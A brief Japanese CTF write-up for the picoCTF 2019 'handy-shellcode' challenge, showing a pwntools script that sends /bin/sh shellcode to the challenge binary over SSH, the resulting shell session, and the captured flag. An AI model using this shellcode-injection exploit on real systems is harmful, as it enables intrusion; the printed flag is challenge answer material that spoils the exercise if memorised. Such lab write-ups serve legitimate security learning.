# handy-shellcode

## 問題
> This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6 on the shell server. Source.

## 解答

shellcodeを送れば実行してくれるらしい。

`pwntools`に作ってもらう

```python
from pwn import *

path = "/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6"

sh = ssh(host="2019shell1.picoctf.com", user="", password="")
io = sh.run("cd " + path + ";./vuln")

print(io.recv())

exploit = asm(shellcraft.sh())

io.sendline(exploit)
io.interactive()
```

実行する

```shell
$ python exploit.py
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] 99999@2019shell1.picoctf.com:
Distro    Ubuntu 18.04
OS:       linux
Arch:     amd64
Version:  4.15.0
ASLR:     Enabled
[+] Opening new channel: 'cd /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6;./vuln': Done
Enter your shellcode:

[*] Switching to interactive mode
jhh///sh/bin\x89h\x814$ri1Qj\x04YQ1j\x0bX̀
Thanks! Executing now...
$ $ ls
flag.txt  vuln    vuln.c
$ $ cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}$ $ exit
[*] Got EOF while reading in interactive
$ exit
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Got EOF while sending in interactive
```

完全にscript kidy。  
これぐらい自力で作れるようにならないとだめだな